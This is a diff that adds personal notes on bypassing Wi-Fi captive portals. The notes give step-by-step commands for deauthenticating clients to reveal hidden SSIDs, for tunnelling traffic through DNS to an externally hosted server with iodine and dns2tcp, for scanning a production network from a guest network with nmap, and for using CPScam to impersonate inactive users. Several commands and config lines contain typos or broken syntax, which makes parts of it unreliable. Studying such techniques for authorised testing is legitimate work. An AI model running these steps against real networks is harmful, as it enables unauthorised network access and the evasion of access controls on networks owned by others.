@@ -1,0 +1,144 @@
+Captive Portal Bypass
+
+
+Attack Vector: Finding SSID of Hidden Networks
+To identify the SSID of hidden networks, you need wireless clients to be connected to that network.
+	Running airodump-ng can identify the
+		BSSID of the hidden network
+		clients connected to that BSSID
+		channel on which the SSID is being broadcast
+
+airmon-ng start wlan0
+airodumg-ng wlan0mon
+airodump-ng wlan0mon -c <CHANNEL> -b <BSSID>
+
+once a client is connected to the network
+once we have identified the target BSSID, we need to send a de-authentication packet to the Access Point
+
+aireplay-ng --deauth 1 -a <BSSID> wlan0mon
+	--deauth1 : sends one de-authentication broadcast packet to the Access Point
+	-a <BSSID>: defines the MAC Address of the Access Point we are targeting
+
+when the ‘de-authentication’ packet is sent, the hidden SSID is captured by the mon0 card,as the client tries to connect back to the network
+
+having SSID of the hidden wireless network, simply connect to the network and obtain an IP address/DHCP lease
+	-these networks are usually configured with DHCP servers as they are practically used for ‘guests’
+
+	
+	
+Attack Vector: Bypass Authentication
+DNS tunneling attack
+Tunneling can be used in such cases if the environment does not restrict protocols like ICMP, DNS etc. before authentication.
+	-are domains names are able to be resolved?
+	-setup an externally hosted DNS server and tunnel HTTP requests into the DNS requests
+	*https://www.your-freedom.net/
+
+*set up DNS proxying tunnel with iodine
+	**cheap domains: https://www.namecheap.com/
+SERVER
+Install
+sudo apt-get install iodine
+	OR
+git clone https://github.com/yarrick/iodine.git
+cd iodine; make install
+sudo iodined -c -f 10.0.0.1 -P password t.mydomain.com
+
+Run Iodine Server
+sudo iodined -c -f 10.0.0.1 -P password t.mydomain.com
+	# - c   Disable checking the client IP address on all incoming requests. Makes connections faster.
+	# - f   Maintains the Iodine server on the foreground. (Good for debuggin') You can leave this out if you want to the server to run on the background. 
+	# - P   Allows you to define some password so that only you can use the Iodine server.
+	# 10.0.0.1 This is going to be the "private network address" that the server will set up. This can be any other "private" addresses (192.162.0.1, etc.)
+	# t.mydomain.com This corresponds to the NS record you previously set up on Namecheap.
+
+Client
+Setup/Install
+sudo apt-get install iodine proxychains firefox
+Run Iodine Client(from captive network)
+sudo iodine -f -P password t.mydomain.com
+	-connection is set up
+	-10.0.0.1 (or whatever address you set up on the server) is now directly connected to the Iodine DNS server
+	--acts as a sort of router
+	SSH to it directly
+ssh -D 1990 10.0.0.1
+	-open a socks4 tunnel
+vi /etc/proxychains.conf
+i
+>strict_chain
+>quiet_mode
+>proxy_dns
+>tcp_read_time_out 5000
+>tcp_connect_time_out 1000
+>[ProxyList]
+>socks4	127.0.0.1 1990
+proxychains firefox
+	OR
+sshuttle --dns -r username@mydomain.com 0/0
+
+dns2tcp
+http://www.hsc.fr/ressources/outils/dns2tcp/download/dns2tcp-0.3.tar.gz
+Server
+Install/Setup
+echo 'dnstunnel    IN     NS your.public.server.isp.com.' >> /etc/resolv.conf
+tar xzvf dns2tcp-0.3.tar.gz
+cd dns2tcp-0.3
+configure
+make install
+	-will create two binaries (dns2tcpd and dns2tcpc) and their respective manpages. Now create a configuration file /etc/dns2tcpd.con
+touch /etc/dns3tcpd.conf
+# cat >/etc/dns2tcpd.conf <<EOF
+listen = $(ifconfig eth0 | awk '{for(i=1;i<=NF;i++)if($i=='inet|inet6')print $(i+1)}' - )
+port = 53
+user=nobody
+chroot = /var/empty/dns2tcp/
+domain = dnstunnel.mydomain.com
+ressources = ssh:127.0.0.1:22
+EOF
+#
+./dns2tcpd -F -d 1 -c dns2tcpd.conf
+	-start the daemon
+	- -F : run in foreground 
+	- -d 1 : enable debugging
+Client
+# cat >/etc/dns2tcpc.conf <<EOF
+domain = dnstunnel.mydomain.com
+ressource = ssh
+local_port = 2222
+debug_level=1
+EOF
+#
+./dns2tcpc -z dnstunnel.mydomain.net <dns_server>
+	-check for communication with the server
+	--#*dns_server can be your public server or, if you are forced, the local DNS
+./dns2tcpd -c -f dns2tcpc.conf
+	-start a tunnel with encapsulated SSH packet
+ssh -p 2222 user@127.0.0.1
+	-start SSH session
+
+	
+	
+	
+
+Attack Vector: Network Segregation
+	-connectivity from the Guest wireless network to the corporate network
+	--once the separation wall between the two environments is broken, the ‘approved exceptions’ keep coming
+
+	To test if you networks are segregated
+		-run from the guest network against production network
+		--any ports found open will be indicative of the holes in the firewall
+		
+nmap -sS -v -F <TARGET_IP_RANGE_OF_PRODUCTION_NETWORK>
+nmap -sS -v -Pn -p0-65535 <TARGET_IP_RANGE_OF_PRODUCTION_NETWORK>
+
+
+
+
+
+tools:
+CPScam
+https://github.com/codewatchorg/cpscam.git
+http://www.willhackforsushi.com/code/cpscam.pl
+perl cpscam.pl <ethX> <ListenIP> <SubnetMask> <InactivityTimeout> <CaptiveLogoffURL>
+	-Bypass captive portals by impersonating inactive users
+Anubis
+https://github.com/sundaysec/anubis.git
